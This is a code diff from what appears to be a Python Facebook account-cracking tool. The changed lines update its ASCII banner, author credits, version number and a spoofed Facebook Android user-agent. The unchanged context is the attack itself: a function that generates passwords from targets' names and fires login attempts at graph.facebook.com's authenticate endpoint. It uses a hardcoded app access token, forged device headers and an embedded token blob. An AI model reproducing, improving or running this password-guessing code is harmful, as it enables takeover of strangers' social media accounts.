@@ -283,27 +283,27 @@ def Trial(PF):
 TrialExist=""
 logo=(f"""\033[1;37m
 
-{green}   .----------------.   .----------------. 
+{green}        .----------------.   .----------------. 
 | .--------------. | | .--------------. |
-| | ____    ____ | | | |  _______     | |
-| ||_   \  /   _|| | | | |_   __ \    | |
-| |  |   \/   |  | | | |   | |__) |   | |
-| |  | |\  /| |  | | | |   |  __ /    | |
-| | _| |_\/_| |_ | | | |  _| |  \ \_  | |
-| ||_____||_____|| | | | |____| |___| | |
+| |  ________    | | | |   ________   | |
+| | |_   ___ `.  | | | |  |  __   _|  | |
+| |   | |   `. \ | | | |  |_/  / /    | |
+| |   | |    | | | | | |     .'.' _   | |
+| |  _| |___.' / | | | |   _/ /__/ |  | |
+| | |________.'  | | | |  |________|  | |
 | |              | | | |              | |
 | '--------------' | | '--------------' |
  '----------------'   '----------------' 
-{green}  
-{green}  
+{green}       
+{green}      
   {green}      
-{green}   
+{green}      
 {green}  
    
 ─────────────────────────────────────────────
- {green}[{red}–{green}] FACEBOK : A♡M
- {green}[{red}–{green}] GITHUB  : achraf-♡
- {green}[{red}–{green}] VERSION : 0.4
+ {green}[{red}–{green}] FACEBOK : achraf 
+ {green}[{red}–{green}] GITHUB  : Algérie-16
+ {green}[{red}–{green}] VERSION : 0.5
  {green}[{red}–{green}] SERVICE : Free  
 ─────────────────────────────────────────────""")
 # I love you Mom 
@@ -580,7 +580,7 @@ def M_file_2(ids,names,passlist):
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                                 accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 11.6.5; RMX3586 Build/QQ3A.200508.039) [FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953126;FBDM/{density=3.8,width=973,height=1468};FBLC/en_AU;FBCR/Zybre Mobile;FBMF/Realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3586;FBSV/11.6.5;FBCA/arm64-v8a:armeabi;]"+"Dalvik/2.1.0 (Linux; U; Android 14.5.2; X748 Build/QP1A.160827.028) [FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/319214969;FBDM/{density=2.375,width=939,height=1254};FBLC/fr_CA;FBCR/Vidéotron;FBMF/Infinix;FBBD/infinix;FBPN/com.facebook.katana;FBDV/X748;FBSV/14.5.2;FBCA/x86_64:x86:arm64-v8a:armeabi;]"+"Dalvik/2.1.0 (Linux; U; Android 5.5.2; GT-I9200 Build/PD2A.110907.013) [FBAN/FB4A;FBAV/58.0.0.28.70;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/18971721;FBCR/Vodafone UK;FBMF/Samsung;FBBD/samsung;FBDV/GT-I9200;FBSV/5.5.2;FBCA/x86:arm64-v8a;]"
+                                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 13.5.4; K3 Note Build/TQ3A.220409.019) [FBAN/FB4A;FBAV/471.0.0.0.2;FBBV/453200356;FBDM/{density=3.8,width=1424,height=2534};FBLC/en_US;FBRV/453671450;FB_FW/2;FBCR/Verizon Wireless;FBMF/Lenovo;FBBD/lenovo;FBPN/com.facebook.katana;FBDV/K3 Note;FBSV/13.5.4;FBOP/20;FBCA/x86_64:x86:armeabi-v7a;;]"
                                 head = {'User-Agent': u2a,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                                 data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                                 data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
